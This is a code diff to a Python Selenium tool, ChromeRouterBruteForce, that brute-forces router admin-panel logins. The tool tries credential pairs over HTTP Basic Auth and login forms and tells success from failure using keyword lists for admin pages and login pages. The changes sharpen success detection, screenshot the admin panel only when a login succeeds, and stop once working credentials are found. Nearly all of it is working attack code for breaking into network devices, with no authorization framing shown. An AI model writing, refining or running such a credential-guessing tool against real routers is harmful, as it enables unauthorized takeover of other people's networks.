@@ -432,6 +432,14 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Failed to take screenshot: {e}{Colors.END}")
             return None
     
+    def quit(self):
+        """Quit the browser driver"""
+        if hasattr(self, 'driver') and self.driver:
+            try:
+                self.driver.quit()
+            except:
+                pass
+    
     def handle_alert(self):
         """Handle browser alerts (login failure messages)"""
         try:
@@ -445,12 +453,15 @@ class ChromeRouterBruteForce:
     def test_http_basic_auth(self, username, password, login_url):
         """Test HTTP Basic Authentication"""
         try:
+            if not hasattr(self, 'driver') or not self.driver:
+                return False, "Driver not initialized"
+                
             parsed_url = urlparse(login_url)
             auth_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{parsed_url.path}"
             
             print(f"{Colors.BLUE}[*] Testing HTTP Basic Auth: {username}:{password}{Colors.END}")
             self.driver.get(auth_url)
-            time.sleep(3)
+            time.sleep(5)  # Wait longer for page to load completely
             
             current_url = self.driver.current_url
             page_source = self.driver.page_source.lower()
@@ -458,12 +469,23 @@ class ChromeRouterBruteForce:
             # Check if we successfully bypassed auth
             if "data:," not in current_url and current_url != "about:blank":
                 # Check for admin panel indicators
-                admin_indicators = ['admin', 'dashboard', 'control panel', 'configuration', 'settings', 'system', 'status', 'network', 'router', 'gateway']
+                admin_indicators = ['admin', 'dashboard', 'control panel', 'configuration', 'settings', 'system', 'status', 'network', 'router', 'gateway', 'management', 'monitor', 'device', 'interface', 'wan', 'lan', 'wireless', 'firewall', 'nat', 'dhcp', 'dns', 'qos', 'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart', 'main menu', 'welcome', 'logout', 'log out']
                 admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
                 
-                if admin_count >= 2:
+                # Check for login page indicators (negative)
+                login_indicators = ['username', 'password', 'login', 'sign in', 'authentication', 'enter credentials', 'user login', 'admin login', 'router login', 'invalid', 'incorrect', 'failed', 'error', 'denied', 'wrong', 'access denied', 'please login', 'enter username']
+                login_count = sum(1 for indicator in login_indicators if indicator in page_source)
+                
+                # Check for specific success indicators
+                success_indicators = ['logout', 'log out', 'welcome', 'dashboard', 'main menu', 'system status', 'device status', 'network status', 'router status', 'admin panel']
+                success_count = sum(1 for indicator in success_indicators if indicator in page_source)
+                
+                # Strong success criteria: more admin indicators than login indicators AND has success indicators
+                if admin_count > login_count and admin_count >= 3 and success_count >= 1:
                     print(f"{Colors.GREEN}[+] HTTP Basic Auth successful! {username}:{password}{Colors.END}")
-                    screenshot_path = self.take_screenshot(f"success_basic_auth_{username}_{password}")
+                    # Wait a bit more for admin panel to fully load
+                    time.sleep(2)
+                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
                     return True, screenshot_path
             
             return False, "HTTP Basic Auth failed"
@@ -483,10 +505,7 @@ class ChromeRouterBruteForce:
             
             # Navigate to login page for form-based authentication
             self.driver.get(login_url)
-            time.sleep(3)  # Wait for page to load completely
-            
-            # Take initial screenshot
-            self.take_screenshot(f"initial_page_{username}_{password}")
+            time.sleep(5)  # Wait longer for page to load completely
             
             # Detect login form
             username_field, password_field = self.detect_login_form()
@@ -518,14 +537,12 @@ class ChromeRouterBruteForce:
                 password_field.send_keys("\n")
             
             # Wait for page to load and handle any alerts
-            time.sleep(3)
+            time.sleep(5)  # Wait longer for page to load completely
             
             # Check for alerts (login failure messages)
             alert_text = self.handle_alert()
             if alert_text:
                 print(f"{Colors.YELLOW}[-] Login failed: {alert_text}{Colors.END}")
-                # Take screenshot of failed login with alert
-                self.take_screenshot(f"failed_alert_{username}_{password}")
                 return False, f"Alert: {alert_text}"
             
             # Check if login was successful
@@ -533,13 +550,13 @@ class ChromeRouterBruteForce:
             
             if success:
                 print(f"{Colors.GREEN}[+] Login successful! {reason}{Colors.END}")
-                # Take screenshot of successful login (admin panel)
+                # Wait a bit more for admin panel to fully load
+                time.sleep(3)
+                # Take screenshot of successful login (admin panel) - ONLY when successful
                 screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
                 return True, screenshot_path
             else:
                 print(f"{Colors.YELLOW}[-] Login failed: {reason}{Colors.END}")
-                # Take screenshot of failed login
-                self.take_screenshot(f"failed_{username}_{password}")
                 return False, reason
                 
         except Exception as e:
@@ -582,8 +599,9 @@ class ChromeRouterBruteForce:
                         if result and result.endswith('.png'):
                             stats['screenshots_taken'] += 1
                     
-                    # Wait a bit before next attempt
-                    time.sleep(2)
+                    # Stop testing other credentials once we find a working one
+                    print(f"{Colors.YELLOW}[*] Found working credentials - stopping further tests for this URL{Colors.END}")
+                    break
                 else:
                     print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                 
